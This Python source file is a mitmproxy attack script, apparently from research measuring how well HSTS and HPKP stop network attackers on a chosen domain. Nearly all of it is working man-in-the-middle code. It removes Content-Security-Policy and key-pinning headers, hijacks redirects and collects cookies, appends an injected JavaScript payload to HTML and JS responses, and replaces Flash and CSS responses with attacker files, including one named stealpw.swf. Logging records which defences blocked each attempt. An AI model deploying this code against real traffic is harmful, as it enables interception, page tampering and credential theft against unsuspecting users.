import logging
logging.basicConfig(level=logging.DEBUG)

from mitmproxy.models import decoded
from netlib.http.headers import Headers
from urlparse import urlparse, urljoin
from slimit.parser import Parser
import sys, re, json, requests
from collections import defaultdict, Mapping

from HSTSPreloadList import HSTSPreloadList
from HPKPPreloadList import HPKPPreloadList

import magic, os, tinycss


"""
Call this script as follows:

mitmdump -t "." -s "attacker.py a4 yahoo.com"

MitMproxy will automatically keep track of cookies, no need to have our own cookiejar (with -t)
"""
attackertype = None
attackedDomainname = None

hijackRedirects = True #and False

HSTSPERMFILE = "/tmp/hsts.json" #FIXME
HPKPPERMFILE = "/tmp/hpkp.json" # FIXME
SCRIPTPATH = os.path.dirname(os.path.realpath(__file__))

jsblob = open("%s/js/script.js" % SCRIPTPATH).read()
swfblob = open("%s/swf/stealpw.swf" % SCRIPTPATH).read()
cssblob = open("%s/css/style.css" % SCRIPTPATH).read()
jsParser = Parser()

# preload lists
hstsPreload = None
hpkpPreload = None
# "learned" records
hstsRecords = None
hpkpRecords = None
# "deleted" records
hstsRemovals = defaultdict(dict)
hpkpRemovals = defaultdict(dict)

attackRecord = {
    "urls": defaultdict(dict)
}


############################ do not touch
def start(content, argv): #{{{
    if len(argv) != 3:
        logging.error("Require attackmodel (a1-a4) and domain name arguments")
        sys.exit(1)

    global attackertype, attackedDomainname
    attackertype = argv[1]
    attackedDomainname = argv[2]
    if attackertype not in ["a1", "a2", "a3", "a1ca", "a2ca", "god"]:
        logging.error("Unknown attacker type %s" % attackertype)
        sys.exit(1)
    else:
        logging.info("Attacker type %s" % attackertype)
        if attackertype in ["a3", "god"]:
            global hijackRedirects
            hijackRedirects = False # disable redirect hijacking when we have access to what is inside HTTPS

    global attackRecord
    attackRecord["domain"] = attackedDomainname
    attackRecord["attacker"] = attackertype

    global hstsPreload, hpkpPreload, hstsRecords, hpkpRecords
    hstsPreload = HSTSPreloadList(jsonfile = HSTSPERMFILE)
    hpkpPreload = HPKPPreloadList(jsonfile = HPKPPERMFILE)
    hstsRecords = HSTSPreloadList(downloadIfNeeded = False)
    hstsRecords.clear()
    hpkpRecords = HSTSPreloadList(downloadIfNeeded = False)
    hpkpRecords.clear()


#}}}
def isHSTSActive(dn): # {{{
    return hstsPreload.hostnameInList(dn) or hstsRecords.hostnameInList(dn)
#}}}
def isHPKPActive(dn): # {{{
    return hpkpPreload.hostnameInList(dn) or hpkpRecords.hostnameInList(dn)
#}}}
def handle_HSTS(dn, header): # {{{
    # 'max-age=31536000; includeSubDomains; preload'
    logging.debug("Processing HSTS header for {}: {}".format(dn, header))

    fields = [x.strip().lower() for x in header.split(";") if x.strip() != ""]
    keep = True
    subs = False

    for f in fields:
        parts = f.split("=")
        if len(parts) > 1 and parts[0] == "max-age":
            age = int(parts[1])
            if age == 0:
                keep = False
        if parts[0] == "includeSubDomains".lower():
            subs = True

    global hstsRecords
    if keep:
        logging.debug("Storing HSTS for {}. includeSubDomains = {}".format(dn, subs))
        hstsRecords.addDomain(dn, subs)
    else:
        logging.debug("Forgetting HSTS for {}".format(dn))
        hstsRecords.delDomain(dn, subs)
        hstsRemovals[dn] = subs
#}}}
def handle_HPKP(dn, header): # {{{
    # pin-sha256="base64=="; max-age=expireTime [; includeSubdomains][; report-uri="reportURI"]
    logging.debug("Processing HPKP header for {}: {}".format(dn, header))

    fields = [x.strip().lower() for x in header.split(";") if x.strip() != ""]
    keep = True
    subs = False

    for f in fields:
        parts = f.split("=")
        if len(parts) > 1 and parts[0] == "max-age":
            age = int(parts[1])
            if age == 0:
                keep = False
        if parts[0] == "includeSubDomains".lower():
            subs = True

    global hpkpRecords
    if keep:
        logging.debug("Storing HPKP for {}. includeSubDomains = {}".format(dn, subs))
        hpkpRecords.addDomain(dn, subs)
    else:
        logging.debug("Forgetting HPKP for {}".format(dn))
        hpkpRecords.delDomain(dn, subs)
        hpkpRemovals[dn] = subs
#}}}
def request(context, flow): #{{{
    global attackertype
    domainname = flow.request.host.lower()
    if domainname == "dumprecord":
        dumpAttackRecord("mitmproxy-output-%s.json" % attackertype)
#}}}
def response(context, flow): #{{{
    global attackertype

    url = flow.request.url
    domainname = flow.request.host.lower()

    # For browsers that don't speak countermeasures like HSTS and HPKP, we can
    # emulate this at the proxy level by learning when the website wants these
    # things enforced, and enforcing them here.
    #
    # HSTS + preload list
    # HPKP + prepinned list
    hsts_set = isHSTSActive(domainname)
    hpkp_set = isHPKPActive(domainname)

    # setting a header in this response does not affect the current request itself, only future requests
    hstsheaders = flow.response.headers.get_all("strict-transport-security")
    hpkpheaders = flow.response.headers.get_all("public-key-pins")
    [handle_HSTS(domainname, h) for h in hstsheaders]
    [handle_HPKP(domainname, h) for h in hpkpheaders]

    logResponse(url, { 
        "hstsActive": hsts_set,
        "hpkpActive": hpkp_set, 
        "hstsHeaderSet": len(hstsheaders) > 0,
        "hpkpHeaderSet": len(hpkpheaders) > 0,
        "domainname": domainname,
    })

    # The following headers are specified on a webpage and apply to resources
    # loaded later.  We can only enforce this if we can link resource URLs to
    # webpages from which the requests originate
    # 
    # Upgrade-Insecure-Requests
    # Block-All-Mixed-Content
    # Subresource Integrity

    if attackertype == "a1":
        return A1_response(context, flow, hsts_set, hpkp_set)
    if attackertype == "a2":
        return A2_response(context, flow, hsts_set, hpkp_set)
    if attackertype == "a3":
        return A3_response(context, flow, hsts_set, hpkp_set)
    if attackertype == "a1ca":
        return A1CA_response(context, flow, hsts_set, hpkp_set)
    if attackertype == "a2ca":
        return A2CA_response(context, flow, hsts_set, hpkp_set)
    if attackertype == "god":
        return GOD_response(context, flow, hsts_set, hpkp_set)
#}}}

def domainMatch(url, domain): #{{{
    urlparts = urlparse(url)
    dothostname = "." + urlparts.hostname
    dotdomain = "." + domain
    return dothostname.endswith(dotdomain)
#}}}
def recupdate(d, u): #{{{
    for k, v in u.iteritems():
        if isinstance(v, Mapping):
            r = recupdate(d.get(k, {}), v)
            d[k] = r
        else:
            d[k] = u[k]
    return d
#}}}
############################


def logResponse(url, data): #{{{
    global attackRecord

    attackRecord["urls"][url] = recupdate(attackRecord["urls"][url], data)
#}}}
def dumpAttackRecord(outfile): #{{{
    global attackRecord, hstsRecords, hpkpRecords
    attackRecord["hstsRecord"] = hstsRecords.data
    attackRecord["hpkpRecord"] = hpkpRecords.data
    attackRecord["hstsRemovals"] = hstsRemovals
    attackRecord["hpkpRemovals"] = hpkpRemovals
    json.dump(attackRecord, open(outfile, "w"))
#}}}

def A1_response(context, flow, hsts_set, hpkp_set): #{{{
    global attackedDomainname
    # only HTTP requests to the domain name under attack
    # if HSTS is enabled for this request, don't attack it as it will have been
    # auto-upgraded by the browser to HTTPS

    httpused = flow.request.scheme == "http"
    httpsused = flow.request.scheme == "https"

    if domainMatch(flow.request.url, attackedDomainname):
        if httpsused:
            logResponse(flow.request.url, { "foiled": "HTTPS used" })
            return
        if httpused and hsts_set:
            logResponse(flow.request.url, { "foiled": "HTTP with HSTS used" })
            return
        logResponse(flow.request.url, { "notfoiled": "neither HTTPS nor HTTP+HSTS used" })
        attackresponse(context, flow)
#}}}
def A2_response(context, flow, hsts_set, hpkp_set): #{{{
    global attackedDomainname
    # only HTTP requests to other domain names
    # if HSTS is enabled for this request, don't attack it as it will have been
    # auto-upgraded by the browser to HTTPS
    httpused = flow.request.scheme == "http"
    httpsused = flow.request.scheme == "https"

    if not domainMatch(flow.request.url, attackedDomainname):
        if httpsused:
            logResponse(flow.request.url, { "foiled": "HTTPS used" })
            return
        if httpused and hsts_set:
            logResponse(flow.request.url, { "foiled": "HTTP with HSTS used" })
            return
        logResponse(flow.request.url, { "notfoiled": "neither HTTPS nor HTTP+HSTS used" })
        attackresponse(context, flow)
#}}}
def A3_response(context, flow, hsts_set, hpkp_set): #{{{
    global attackedDomainname
    # any request to another domain
    # HSTS and HPKP are irrelevant here, since the attacker owns the resource server
    if not domainMatch(flow.request.url, attackedDomainname):
        logResponse(flow.request.url, { "notfoiled": "just because" })
        attackresponse(context, flow)
#}}}
def A1CA_response(context, flow, hsts_set, hpkp_set): #{{{
    # any request to this domain, except if HTTPS is used and HPKP is active
    httpused = flow.request.scheme == "http"
    httpsused = flow.request.scheme == "https"
    if domainMatch(flow.request.url, attackedDomainname):
        if httpsused:
            if hpkp_set:
                logResponse(flow.request.url, { "foiled": "HTTPS+HPKP used" })
                return
            else:
                logResponse(flow.request.url, { "notfoiled": "HTTPS without HPKP used" })
                attackresponse(context, flow)
                return
        if httpused:
            if hsts_set:
                if hpkp_set:
                    logResponse(flow.request.url, { "foiled": "HTTP+HSTS+HPKP used" })
                    return
                else:
                    logResponse(flow.request.url, { "notfoiled": "HTTP+HSTS without HPKP used" })
                    attackresponse(context, flow)
                    return
            else:
                logResponse(flow.request.url, { "notfoiled": "HTTP without HSTS used" })
                attackresponse(context, flow)
                return

        logResponse(flow.request.url, { "notfoiled": "neither HTTP nor HTTPS used??" })
        attackresponse(context, flow)
#}}}
def A2CA_response(context, flow, hsts_set, hpkp_set): #{{{
    # any request to other domain, except if HTTPS is used and HPKP is active
    httpused = flow.request.scheme == "http"
    httpsused = flow.request.scheme == "https"
    if not domainMatch(flow.request.url, attackedDomainname):
        if httpsused:
            if hpkp_set:
                logResponse(flow.request.url, { "foiled": "HTTPS+HPKP used" })
                return
            else:
                logResponse(flow.request.url, { "notfoiled": "HTTPS without HPKP used" })
                attackresponse(context, flow)
                return
        if httpused:
            if hsts_set:
                if hpkp_set:
                    logResponse(flow.request.url, { "foiled": "HTTP+HSTS+HPKP used" })
                    return
                else:
                    logResponse(flow.request.url, { "notfoiled": "HTTP+HSTS without HPKP used" })
                    attackresponse(context, flow)
                    return
            else:
                logResponse(flow.request.url, { "notfoiled": "HTTP without HSTS used" })
                attackresponse(context, flow)
                return

        logResponse(flow.request.url, { "notfoiled": "neither HTTP nor HTTPS used??" })
        attackresponse(context, flow)
#}}}
def GOD_response(context, flow, hsts_set, hpkp_set): #{{{
    logResponse(flow.request.url, { "notfoiled": "just because" })
    attackresponse(context, flow)
#}}}

def attackresponse(context, flow): #{{{
    # flow.response.headers["Testing123"] = "456"
    url = flow.request.url

    # on 301/302: fetch the resource completely and return it, but pay attention to cookies!
    if hijackRedirects and flow.response.status_code in [301, 302]:
        # this should not fail, but you never know
        if "location" in flow.response.headers:
            logging.debug("Hijacking redirected %s" % url)
            logResponse(url, { "hijackedRedirect": True })


            # make the same request, but log all cookies
            reqsess = requests.Session()
            myheaders = flow.request.headers
            for h in ["host"]:
                if h in myheaders:
                    del myheaders[h]
            newresp = reqsess.get(url, headers = myheaders)


            # add the new cookies
            newcookies = ["%s=%s" % (k,v) for k,v in reqsess.cookies.items()]
            newheaders = newresp.headers.items()
            for c in newcookies:
                newheaders += [("Set-Cookie", c)]

            # compose result to browser
            flow.response.code = newresp.status_code
            flow.response.reason = newresp.reason
            flow.response.headers = Headers(newheaders)
            flow.response.content = newresp.content
            if "content-encoding" in flow.response.headers:
                flow.response.encode(flow.response.headers["content-encoding"])

            # also update stickycookies with newly learned cookies
            context._master.process_new_response(flow)


    # throw away some headers
    for h in ["content-security-policy", "public-key-pins", "upgrade-insecure-requests"]:
        if h in flow.response.headers:
            logging.info("Removing header '%s': '%s'" % (h, flow.response.headers[h]))
            del flow.response.headers[h]
            logResponse(url, { "headers": { h: True }})
        else:
            logResponse(url, { "headers": { h: False }})

    if "content-type" in flow.response.headers:
        mimetype = flow.response.headers.get_all("content-type")[0]
    else:
        mimetype = ""
    mimetype = ""
    logResponse(url, { "content-type": mimetype })

    with decoded(flow.response):
        url = flow.request.url
        data = flow.response.content
        urlparts = urlparse(url)

        data = attack_js(url, urlparts, mimetype, data)
        data = attack_html(url, urlparts, mimetype, data)
        data = attack_swf(url, urlparts, mimetype, data)
        data = attack_css(url, urlparts, mimetype, data)

        # write back data
        flow.response.content = data
#}}}

def attack_html(url, urlparts, mimetype, data): #{{{
    if urlparts.path.lower().endswith(".html") or urlparts.path.lower().endswith(".htm") or "html" in mimetype.lower() or isHTML(data):
        if "</body>" in data.lower():
            logResponse(url, { "injected": {"HTML": True}})
            logging.info("Attacking HTML in %s" % url)
            global jsblob
            newtext = "<script>%s</script></body>" % jsblob.replace("REPLACEMEWITHPREFIX", "INJECTEDHTML").replace("REPLACEMEWITHURL", url)
            data = re.sub(r'(?is)</body>', newtext, data)
    return data
#}}}
def attack_js(url, urlparts, mimetype, data): #{{{
    if urlparts.path.lower().endswith(".js") or "javascript" in mimetype.lower() or isJavaScript(data):
        logResponse(url, { "injected": {"JS": True}})
        logging.info("Attacking JavaScript in %s" % url)
        # data += ";alert('INJECTEDJAVASCRIPT "+url+" from '+document.location);"
        global jsblob
        data += ";%s" % jsblob.replace("REPLACEMEWITHPREFIX", "INJECTEDJAVASCRIPT").replace("REPLACEMEWITHURL", url)
    return data
#}}}
def attack_swf(url, urlparts, mimetype, data): #{{{
    if urlparts.path.lower().endswith(".swf") or "flash" in mimetype.lower() or isFlash(data):
        logResponse(url, { "injected": {"SWF": True}})
        logging.info("Attacking Flash in %s" % url)
        global swfblob
        data = swfblob
    return data
#}}}
def attack_css(url, urlparts, mimetype, data): #{{{
    if urlparts.path.lower().endswith(".css") or "css" in mimetype.lower() or isCSS(data):
        logResponse(url, { "injected": {"CSS": True}})
        logging.info("Attacking CSS in %s" % url)
        global cssblob
        data = cssblob
    return data
#}}}

def isJSON(txt): #{{{
    try:
        json.loads(txt)
        return True
    except:
        return False
#}}}
def isJavaScript(txt): #{{{
    loglevel = logging.getLogger().getEffectiveLevel()
    logging.getLogger().setLevel(level=logging.INFO)
    try:
        if isJSON(txt):
            return False
        jsParser.parse(txt)
        logging.getLogger().setLevel(level=loglevel)
        return True
    except:
        logging.getLogger().setLevel(level=loglevel)
        return False
#}}}
def isFlash(txt): #{{{
    return "macromedia flash" in magic.Magic().id_buffer(txt).lower()
#}}}
def isHTML(txt): # {{{
    return "HTML document" in magic.Magic().id_buffer(txt)
#}}}
def isCSS(txt): # {{{
    if isJSON(txt) or isJavaScript(txt) or isFlash(txt) or isHTML(txt):
        return False
    try:
        parser = tinycss.make_parser()
        res = parser.parse_stylesheet_bytes(txt)
        if len(res.rules) > len(res.errors) and len(res.rules) > 5:
            return True
    except:
        pass
    return False
#}}}
